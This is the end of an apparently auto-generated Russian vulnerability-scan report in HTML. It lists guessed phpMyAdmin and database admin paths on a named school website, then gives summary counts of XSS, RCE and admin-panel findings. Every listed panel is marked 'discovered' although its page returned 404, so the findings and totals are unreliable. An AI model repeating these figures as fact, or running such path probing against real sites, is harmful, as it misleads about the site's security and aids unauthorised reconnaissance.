+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #11</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/phpmyadmin2</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #12</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/phpmyadmin3</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #13</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/phpmyadmin4</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #14</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/dbadmin</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #15</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/mysql</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #16</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/myadmin</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #17</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/phpmyadmina</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #18</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/sqlmanager</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #19</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/mysqlmanager</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #20</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/p/m/a</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #21</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/PMA</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #22</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/pma</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #23</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/db</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #24</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/db/phpmyadmin</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #25</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/db/phpMyAdmin</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #26</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/db/dbadmin</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #27</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/db/mysql</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #28</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/db/myadmin</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #29</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/db/phpmyadmina</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #30</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/db/sqlmanager</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #31</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/db/mysqlmanager</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                </div>
+            </div>
+            
+    <div class="stats">
+        <h2>📊 СТАТИСТИКА УЯЗВИМОСТЕЙ</h2>
+        <p><strong>Всего уязвимостей:</strong> 69</p>
+    <p><strong>XSS-уязвимости:</strong> 6</p>
+<p><strong>RCE-уязвимости:</strong> 32</p>
+<p><strong>Админ-панели:</strong> 31</p>
+
+    </div>
+    
+            <div class="footer">
+                <p>Отчет сгенерирован: 2025-05-26 17:47:30</p>
+            </div>
+        </div>
+    </body>
+    </html>
+    
